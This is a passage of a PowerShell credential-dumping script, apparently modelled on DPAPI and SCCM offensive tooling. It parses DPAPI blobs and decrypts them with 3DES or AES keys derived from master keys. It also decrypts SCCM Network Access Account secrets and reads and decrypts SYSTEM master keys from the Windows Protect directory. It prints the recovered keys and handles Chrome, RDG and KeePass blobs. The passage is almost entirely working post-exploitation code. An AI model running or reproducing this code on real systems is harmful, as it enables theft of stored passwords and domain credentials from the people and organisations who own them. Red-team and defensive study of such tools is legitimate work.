    $offset       += 16

    if ($blobType -notin "rdg","chrome")
    {
        Write-Host "    guidMasterKey    : $guidString"
        Write-Host "    size             : $($blobBytes.Length)"
    }

    $flags    = [BitConverter]::ToUInt32($blobBytes, $offset)
    $offset  += 4
    
    if ($blobType -notin "rdg","chrome")
    {
        $flagInfo = "0x$($flags.ToString('X8'))"
        
        if ($flags -eq 0x20000000)
        { 
            $flagInfo += " (CRYPTPROTECT_SYSTEM)"
        }
        
        Write-Host "    flags            : $flagInfo"
    }

    $descLength   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $description  = [System.Text.Encoding]::Unicode.GetString($blobBytes, $offset, $descLength)
    $offset      += $descLength

    $algCrypt     = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $algCryptLen  = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $saltLen      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $saltBytes    = $blobBytes[$offset..($offset+$saltLen-1)]
    $offset      += $saltLen

    $hmacKeyLen   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4 + $hmacKeyLen
    $algHash      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4

    if ($blobType -notin "rdg","chrome")
    {
        Write-Host "    algHash/algCrypt : $algHash ($([CryptAlg]$algHash)) / $algCrypt ($([CryptAlg]$algCrypt))"
        Write-Host "    description      : $description"
    }

    $algHashLen   = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $hmac2KeyLen  = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4 + $hmac2KeyLen

    $dataLen      = [BitConverter]::ToInt32($blobBytes, $offset)
    $offset      += 4
    $dataBytes    = $blobBytes[$offset..($offset+$dataLen-1)]

    if ($unprotect -and $blobType -in "blob","rdg","chrome","keepass")
    {
        try
        {
            return [System.Security.Cryptography.ProtectedData]::Unprotect($blobBytes,$entropy,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        }
        
        catch
        {
            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
        }
    }

    if ($MasterKeys.ContainsKey($guidString))
    {
        $keyBytes = [System.Collections.Generic.List[byte]]::new()
        
        for ($i = 0; $i -lt $MasterKeys[$guidString].Length; $i += 2)
        {
            $keyBytes.Add([Convert]::ToByte($MasterKeys[$guidString].Substring($i, 2), 16))
        }
        
        $keyBytes = $keyBytes.ToArray()

        try 
        {
            $hmac = $null
            
            if($algHash -eq 32772)
            { 
                $hmac = [System.Security.Cryptography.HMACSHA1]::new($keyBytes)
            }
            
            elseif ($algHash -eq 32782)
            { 
                $hmac = [System.Security.Cryptography.HMACSHA512]::new($keyBytes)
            }
            
            else 
            {
                Write-Host "    [!] Unsupported hash algorithm: $algHash"
                return ,@()
            }

            $inputBytes      = $saltBytes
            
            if ($entropy)
            { 
                $inputBytes += $entropy
            }
            
            $derivedKeyBytes = $hmac.ComputeHash($inputBytes)
            $hmac.Dispose()

            $keySize         = $algCryptLen / 8
            $finalKeyBytes   = $derivedKeyBytes[0..($keySize-1)]

            $padding         = if ($blobType -eq "credential") { "PKCS7" } else { "None" }
            $decrypted       = Decrypt-Blob -ciphertext $dataBytes -key $finalKeyBytes -algId $algCrypt

            if ($blobType -eq "credential")
            {
                # I dont think we are missing anything by redacting this. Its produces alot of garbage around the data anyway. Should loop back to this later
                #$decText = [System.Text.Encoding]::Unicode.GetString($decrypted)
                #Write-Host "    dec(blob)        : $decText"
            }

            return $decrypted
        }
        
        catch
        {
            Write-Host "    [X] Error during decryption: $_"
        }
    }
    
    else
    {
        if ($blobType -in "rdg","chrome")
        {
            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
        }
        
        else
        {
            Write-Host "    [!] MasterKey GUID not in cache: $guidString"
        }
    }

    return ,@()
}

function Decrypt-Blob {
    param ([byte[]] $ciphertext, [byte[]] $key,[int] $algId)
    
    # Decrypts ciphertext using 3DES or AES-256 based on algorithm ID. Helper for Describe-DPAPIBlob.
    # Hand-off: Returns plaintext to Describe-DPAPIBlob.

    switch ($algId) {
        26115 {  # CALG_3DES
            $ivBytes    = New-Object byte[] 8
            $des        = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
            $des.Key    = $key
            $des.IV     = $ivBytes
            $des.Mode   = [System.Security.Cryptography.CipherMode]::CBC
            $des.Padding= [System.Security.Cryptography.PaddingMode]::Zeros

            try
            {
                $decryptor = $des.CreateDecryptor()
                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            }
            
            catch
            {
                Write-Warning "3DES decryption failed: $_"
                return $null
            }
            
            finally
            {
                
                if ($des)
                { 
                    $des.Dispose()
                }
            }
        }
        
        26128 {  # CALG_AES_256
            $ivBytes    = New-Object byte[] 16
            $aes        = New-Object System.Security.Cryptography.AesManaged
            $aes.Key    = $key
            $aes.IV     = $ivBytes
            $aes.Mode   = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding= [System.Security.Cryptography.PaddingMode]::Zeros

            try
            {
                $decryptor = $aes.CreateDecryptor()
                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            }
            catch
            {
                Write-Warning "AES decryption failed: $_"
                return $null
            }
            
            finally
            {
                if ($aes)
                { 
                    $aes.Dispose()
                }
            }
        }
        
        default 
        {
            return "[!] Unsupported algorithm: $algId"
        }
    }
}

enum CryptAlg {
    CALG_SHA1     = 32772
    CALG_SHA_512  = 32782
    CALG_AES_256  = 26128
    CALG_3DES     = 26115
}


function Is-Unicode {
    param ([byte[]] $bytes)

     # Helper that checks if byte array contains Unicode data. Used during blob decryption analysis.

    if ($bytes.Length -lt 2)
    {
        return $false
    }

    # Check for UTF-16 LE/BE BOM or even-length characteristic
    return (
        ($bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) -or  # UTF-16 LE BOM
        ($bytes[0] -eq 0xFE -and $bytes[1] -eq 0xFF) -or  # UTF-16 BE BOM
        ($bytes.Length % 2 -eq 0)                         # Even-length data
    )
}

function Decrypt-NAA {
    param ([string] $Blob, [hashtable] $MasterKeys)

    # Decrypts Network Access Account (NAA) credential blobs from SCCM using DPAPI master keys.
    # Hand-off: Uses Describe-DPAPIBlob. Returns cleartext to Decrypt-LocalNetworkAccessAccountsWmi.

    $size               = [int]($Blob.Length / 2)
    [byte[]] $blobBytes = New-Object byte[] $size

    for ($i = 0; $i -lt $Blob.Length; $i += 2)
    {
        $blobBytes[$i / 2] = [Convert]::ToByte($Blob.Substring($i, 2), 16)
    }

    $offset          = 4
    $size2           = [int]($Blob.Length / 2)
    [byte[]] $unmanagedArray = New-Object byte[] $size2
    [System.Buffer]::BlockCopy($blobBytes, 4, $unmanagedArray, 0, $blobBytes.Length - $offset)
    $blobBytes       = $unmanagedArray

    if ($blobBytes.Length -gt 0)
    {
        [byte[]] $decBytesRaw = Describe-DPAPIBlob $blobBytes $MasterKeys

        if ($decBytesRaw -ne $null -and $decBytesRaw.Length -ne 0)
        {
            if (Is-Unicode $decBytesRaw)
            {
                $finalIndex = [Array]::LastIndexOf($decBytesRaw, [byte]0)
                
                if ($finalIndex -gt 1)
                {
                    $decBytes = New-Object byte[] ($finalIndex + 1)
                    [System.Array]::Copy($decBytesRaw, 0, $decBytes, 0, $finalIndex)
                    $data = [System.Text.Encoding]::Unicode.GetString($decBytes)

                  # Write-Host "    dec(blob)        : $data"
                    
                    return $data
                }
                
                else
                {
                    $data = [System.Text.Encoding]::ASCII.GetString($decBytesRaw)
                    if ($TaskSequence){ return $data }
                  
                  # Write-Host "    dec(blob)        : $data"
                    
                    return $data
                }
            }
            
            else
            {
                $hexData = ($decBytesRaw | ForEach-Object { $_.ToString("X2") }) -join " "
              
              # Write-Host "    dec(blob)        : $hexData"
                
                return $hexData
            }
        }
        
        else
        {
            return $null
        }
    }
    
    else
    {
        return $null
    }
}


function Triage-SystemMasterKeys {

    # Recursively searches for DPAPI master keys on disk and decrypts them using system DPAPI keys.
    # Hand-off: Uses Get-DPAPIKeys, Decrypt-MasterKeyWithSha. Returns GUID:key mapping to decryption functions.

    if ($global:mappings -and $global:mappings.Count -gt 0)
    {
        return $global:mappings
    }

    $global:mappings = @{}
    $dpapiKeys       = Get-DPAPIKeys

    $rootPath = "$env:SystemRoot\System32\Microsoft\Protect\"

    Get-ChildItem -Path $rootPath -Recurse -Force | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        
        if ([Regex]::IsMatch($_.Name, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$"))
        {
            try
            {
                $masterKeyBytes  = [IO.File]::ReadAllBytes($_.FullName)
                $parentDir       = $_.Directory.Name
                $grandParentDir  = $_.Directory.Parent.Name

                if     ($parentDir -eq 'User')           { $shaBytes = $dpapiUserKeysBytes    }
                elseif ($parentDir -eq 'Machine')        { $shaBytes = $dpapiMachineKeysBytes }
                elseif ($grandParentDir -like 'S-1-5-*') { $shaBytes = $dpapiUserKeysBytes    }
                else                                     { $shaBytes = $dpapiMachineKeysBytes }

                $plainTextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -SHABytes $shaBytes

                foreach ($key in $plainTextMasterKey.Keys)
                {
                    $global:mappings[$key] = $plainTextMasterKey[$key]
                }
            }
            
            catch
            {
                Write-Host "[!] Error triaging $($_.FullName): $($_.Exception.Message)"
            }
        }
    }

    Write-Host "[*] SYSTEM master key cache:"
    
    foreach ($key in $global:mappings.Keys)
    {
        Write-Host "$key`:$($global:mappings[$key])"
    }
    
    Write-Host "`n`n"

    return $global:mappings
}